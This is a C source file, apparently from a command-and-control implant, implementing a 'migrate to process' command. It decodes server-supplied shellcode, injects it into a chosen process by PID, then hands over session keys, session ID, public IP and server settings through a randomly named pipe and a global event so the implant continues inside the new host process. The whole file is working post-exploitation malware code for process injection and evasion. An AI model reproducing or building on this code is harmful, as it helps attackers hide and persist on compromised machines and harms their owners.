#include <stdint.h>
#include <stdbool.h>
#include <process.h>
#include <string.h>
#include "agent_commands.h"
#include "agent_session.h"
#include "agent_config.h"
#include "agent_utility.h"
#include "agent_event.h"

command_result* cmd_migrate_to_process(session* sess, packet* pck) {
	DECLARE_RESULT_WITH_FEEDBACK(error);

	char* inject_info = ZERO(char);
	char* effective_config = ZERO(char);
	char* active_server = ZERO(char);
	char* session_info = ZERO(char);
	uint8_t* shellcode = ZERO(uint8_t);
	cJSON* jinject_info = ZERO(cJSON);
	cJSON* jsession_info = ZERO(cJSON);
	size_t shellcode_len = 0;
	pipe_handle* hPipe = ZERO(pipe_handle);

	// read JSON
	inject_info = MEM_ALLOC(pck->data_size + 1);
	if (!inject_info) goto fail;
	memcpy(inject_info, pck->data, pck->data_size);
	jinject_info = cJSON_Parse(inject_info);
	if (!jinject_info) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// parse json
	cJSON* jshellcode = cJSON_GetObjectItem(jinject_info, MIGRATE_SHELLCODE);
	cJSON* jpid = cJSON_GetObjectItem(jinject_info, MIGRATE_PID);
	if (!jshellcode || !jpid) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// sanity check
	if (jpid->valueint == _getpid()) goto fail;

	// decode shellcode
	shellcode = base64_decode(jshellcode->valuestring, &shellcode_len);
	if (!shellcode) {
		error->error_code = ERROR_BASE64_DECODE;
		goto fail;
	}

	// create the json string with the session configuration	
	jsession_info = cJSON_CreateObject();
	if (!jsession_info) goto fail;

	// effective config
	effective_config = cJSON_Print(sess->config);
	if (!effective_config) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	cJSON* jconfig = cJSON_CreateString(effective_config);
	if (!jconfig) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_EFFECTIVECONFIG, jconfig)) goto fail;

	// session key
	char* sess_key = base64_encode(32, sess->session_key);
	if (!sess_key) {
		error->error_code = ERROR_BASE64_DECODE;
		goto fail;
	}

	cJSON* jsession_key = cJSON_CreateString(sess_key);
	FREE(sess_key);
	if (!jsession_key) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_SESSION_KEY, jsession_key)) goto fail;

	// original session key
	char* original_sess_key = base64_encode(32, sess->original_session_key);
	if (!original_sess_key) {
		error->error_code = ERROR_BASE64_DECODE;
		goto fail;
	}

	cJSON* joriginal_session_key = cJSON_CreateString(original_sess_key);
	FREE(original_sess_key);
	if (!joriginal_session_key) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_ORIGINALSESSIONKEY, joriginal_session_key)) goto fail;

	// session key iteration	
	cJSON* jkey_iteration = cJSON_CreateNumber(sess->session_key_iteration);
	if (!jkey_iteration) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_SESSIONKEYITERATION, jkey_iteration)) goto fail;

	// public IP
	cJSON* jpublic_ip = cJSON_CreateString(sess->public_IP);
	if (!jpublic_ip) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_PUBLICIP, jpublic_ip)) goto fail;

	// active server
	cJSON* jactive_server = cJSON_CreateObject();
	if (!jactive_server) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	cJSON* jactive_server_index = cJSON_CreateNumber(sess->active_server_index);
	if (!jactive_server_index) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jactive_server, sess->active_server_type, jactive_server_index)) goto fail;
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_ACTIVESERVER, jactive_server)) goto fail;

	// session ID
	char* session_id = MEM_ALLOC(sess->session_id_size + 1);
	if (!session_id) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	memcpy(session_id, sess->session_id, sess->session_id_size);
	cJSON* jsession_id = cJSON_CreateString(session_id);
	FREE(session_id);
	if (!jsession_id) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}
	if (!cJSON_AddItemToObject(jsession_info, MIGRATION_SESSIONID, jsession_id)) goto fail;

	// write the json string to the remote process
	session_info = cJSON_Print(jsession_info);
	if (!session_info) {
		error->error_code = ERROR_JSON_CONVERSION;
		goto fail;
	}

	// create the named pipe for the process to inject
	uint32_t seed = system_fingerprint() + jpid->valueint;
	char pipe_name[64] = "//./pipe/";
	gen_random_string(seed, 32, &pipe_name[strlen(pipe_name)]);

	// create the named pipe
	hPipe = pipe_server_new(pipe_name, 0x4000, true, false);
	if (!hPipe) {
		error->error_code = ERROR_PIPE_CREATION;
		goto fail;
	}

	// create the sync event
	char event_name[4096] = { 0 };
	strcat(event_name, "Global\\");
	gen_random_string(seed + 5, 30, &event_name[strlen(event_name)]);
	event_handle* e = event_new(event_name);
	if (!e) {
		error->error_code = ERROR_EVENT_CREATION;
		goto fail;
	}

	// close the single instance event
	event_free(sess->single_instance_event);
	sess->single_instance_event = ZERO(event_handle);

	// inject the shellcode to be executed
	error->error_code = process_inject_shellcode(jpid->valueint, shellcode_len, (uint8_t*)shellcode, 0);
	if (!SUCCESS(error->error_code)) goto fail;

	// write the session info
	if (!pipe_server_connect(hPipe, 0x4000)) {
		error->error_code = ERROR_PIPE_SERVER_CONNECT;
		goto fail;
	}
	if (!pipe_write(hPipe, strlen(session_info), session_info)) {
		error->error_code = ERROR_PIPE_WRITE;
		goto fail;
	}

	// wait the event from remote process before to close the pipe	
	bool event_ok = event_wait(e, 10000);
	event_free(e);
	if (!event_ok) {
		error->error_code = ERROR_EVENT_NOT_SIGNALED;
		goto fail;
	}

	pipe_free(hPipe);
	FREE(inject_info);
	FREE(effective_config);
	FREE(active_server);
	FREE(session_info);
	FREE(shellcode);
	if (jinject_info) cJSON_free(jinject_info);
	if (jsession_info) cJSON_free(jsession_info);

	// migration OK
	sess->exit = true;
	SET_RESULT_SUCCESS(error);
	return error;
fail:
	pipe_free(hPipe);
	FREE(inject_info);
	FREE(effective_config);
	FREE(active_server);
	FREE(session_info);
	FREE(shellcode);
	if (jinject_info) cJSON_free(jinject_info);
	if (jsession_info) cJSON_free(jsession_info);
	return error;
}